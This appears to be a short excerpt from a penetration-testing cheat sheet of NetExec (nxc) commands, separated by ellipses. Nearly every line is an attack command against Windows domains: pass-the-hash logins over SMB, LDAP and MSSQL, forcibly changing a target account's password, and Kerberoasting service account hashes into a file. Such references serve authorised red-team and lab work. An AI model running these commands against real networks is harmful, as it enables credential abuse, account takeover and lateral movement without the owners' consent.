...
nxc smb $IP -u $USER -H $HASH -M change-password -o NEWPASS='NewPass123!'
...
nxc smb $IP -u $USER -H $HASH -M change-password -o USER=$TARGET NEWPASS='NewPass123!'
```
...
nxc ldap $DC_IP -u $USER -H $HASH -d $DOMAIN --dns-server $DC_IP --kerberoast hashes.txt # PTH version
...
nxc mssql $IP -u $USER -p $PASSWORD -windows-auth                 # Windows/Kerberos auth
nxc mssql $IP -u $USER -H $HASH -windows-auth                     # PTH with Windows auth
